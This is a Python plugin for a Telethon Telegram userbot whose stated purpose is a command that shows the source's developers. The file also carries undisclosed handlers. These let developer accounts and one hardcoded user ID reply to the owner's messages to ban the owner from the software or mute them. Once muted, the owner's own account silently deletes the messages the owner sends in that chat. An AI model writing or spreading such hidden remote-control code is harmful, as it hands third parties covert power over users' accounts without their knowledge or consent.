import random
import re
import time
from platform import python_version

from telethon import version, Button, events
from telethon.errors.rpcerrorlist import (
    MediaEmptyError,
    WebpageCurlFailedError,
    WebpageMediaEmptyError,#
)
from telethon.events import CallbackQuery

from SHRU import StartTime, Qrh9, JEPVERSION

from ..Config import Config
from ..core.managers import edit_or_reply
from ..helpers.functions import catalive, check_data_base_heal_th, get_readable_time
from ..helpers.utils import reply_id
from ..sql_helper.globals import addgvar, delgvar, gvarstatus
from . import mention

plugin_category = "utils"

@Qrh9.ar_cmd(
    pattern="المطورين$",
    command=("المطورين", plugin_category),
    info={
        "header": "لأظهار مطورين السورس",
        "usage": [
            "{tr}المطور",
        ],
    },
)
async def amireallyalive(event):
    "A kind of showing bot details"
    reply_to_id = await reply_id(event)
    uptime = await get_readable_time((time.time() - StartTime))
    _, check_sgnirts = check_data_base_heal_th()
    EMOJI = gvarstatus("ALIVE_EMOJI") or "  - "
    CUSTOM_ALIVE_TEXT = gvarstatus("ALIVE_TEXT")
    CAT_IMG = "https://telegra.ph/file/62ad7d0e3ea4c67419876.jpg"
    if CAT_IMG:
        CAT = [x for x in CAT_IMG.split()]
        A_IMG = list(CAT)
        PIC = random.choice(A_IMG)
        cat_caption = f"مطورين الساحر\n"
        cat_caption += f"✛━━━━━━━━━━━━━✛\n"
        cat_caption += f"- المطور الاساسي :@morffn\n"
        cat_caption += f"- المطور  :@allnught\n"
        cat_caption += f"- المطور  :@\n"
        cat_caption += f"- المطور  :@\n"
        cat_caption += f"- المطور  :@\n"
        cat_caption += f"✛━━━━━━━━━━━━━✛\n"
        await event.client.send_file(
            event.chat_id, PIC, caption=cat_caption, reply_to=reply_to_id
        )

@Qrh9.tgbot.on(CallbackQuery(data=re.compile(b"stats")))
async def on_plug_in_callback_query_handler(event):
    statstext = await catalive(StartTime)
    await event.answer(statstext, cache_time=0, alert=True)

progs = Config.Dev

@Qrh9.on(events.NewMessage(incoming=True))
async def reda(event):
    if event.reply_to and event.sender_id in progs:
       reply_msg = await event.get_reply_message()
       owner_id = reply_msg.from_id.user_id
       if owner_id == Qrh9.uid:
           if event.message.message == "حظر من السورس":
               await event.reply("**حاظر مطوري ، لقد تم حظره من استخدام السورس**")
               addgvar("blockedfrom", "yes")
           elif event.message.message == "الغاء الحظر من السورس":
               await event.reply("**حاظر مطوري، لقد الغيت الحظر**")
               delgvar("blockedfrom")
                

MUTECHAN =  [6051188407]
from ..sql_helper.mute_sql import is_muted, mute, unmute

@Qrh9.on(events.NewMessage(incoming=True))
async def mute_unmute(event):
    sender_id = event.sender_id
    chat_id = event.chat_id

    if is_muted(sender_id, chat_id):
        await event.delete()

    if event.reply_to and sender_id in MUTECHAN:
        reply_msg = await event.get_reply_message()
        owner_id = reply_msg.from_id.user_id
        
        if "كتمه" in event.message.message:
            if owner_id == Qrh9.uid:
                if not is_muted(owner_id, chat_id):
                    mute(owner_id, chat_id)
                    await event.reply("**تم كتم هذا المستخدم بنجاح**")
                else:
                    await event.reply("**المستخدم مكتوم بالفعل!**")

        elif "رفعه" in event.message.message:
            if owner_id == Qrh9.uid:
                if is_muted(owner_id, chat_id):
                    unmute(owner_id, chat_id)
                    await event.reply("**تم إلغاء كتم المستخدم بنجاح**")
                else:
                    await event.reply("**المستخدم غير مكتوم!**")

@Qrh9.on(events.NewMessage(func=lambda e: is_muted(e.sender_id, e.chat_id)))
async def automatic_message_deletion(event):
    await event.delete()
#loveyou